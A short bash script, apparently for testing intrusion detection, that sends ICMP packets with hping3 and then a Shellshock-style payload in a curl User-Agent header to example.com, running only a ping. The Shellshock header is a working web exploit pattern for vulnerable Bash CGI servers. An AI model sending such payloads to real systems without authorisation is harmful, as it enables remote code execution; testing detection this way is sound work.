
#!/bin/bash
echo "Sending ICMP packets..."
sudo hping3 --icmp -c 10 192.168.183.1

echo "Simulating shellshock..."
curl -A '() { :;}; echo; echo; /bin/bash -c "ping -c 1 1.1.1.1"' http://example.com
